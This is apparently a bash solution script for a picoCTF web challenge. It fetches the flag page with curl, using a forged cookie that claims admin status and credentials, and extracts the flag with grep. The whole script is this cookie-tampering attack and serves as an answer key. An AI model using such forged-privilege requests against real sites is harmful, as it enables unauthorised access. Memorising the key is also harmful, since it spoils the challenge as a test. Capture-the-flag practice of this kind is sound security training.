#!/bin/bash
curl 'https://jupiter.challenges.picoctf.org/problem/13594/flag' \
	-H 'Connection: keep-alive' \
	-H 'Cache-Control: max-age=0' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
	-H 'Sec-Fetch-Site: same-origin' \
	-H 'Sec-Fetch-Mode: navigate' \
	-H 'Sec-Fetch-User: ?1' \
	-H 'Sec-Fetch-Dest: document' \
	-H 'sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"' \
	-H 'sec-ch-ua-mobile: ?0' \
	-H 'Referer: https://jupiter.challenges.picoctf.org/problem/13594/' \
	-H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \
	-H 'Cookie: _ga=GA1.2.296391047.1616828431; _gid=GA1.2.732954041.1616828431; admin=True; password=admin; username=admin' \
	--compressed | grep -oP "picoCTF{.*?}"
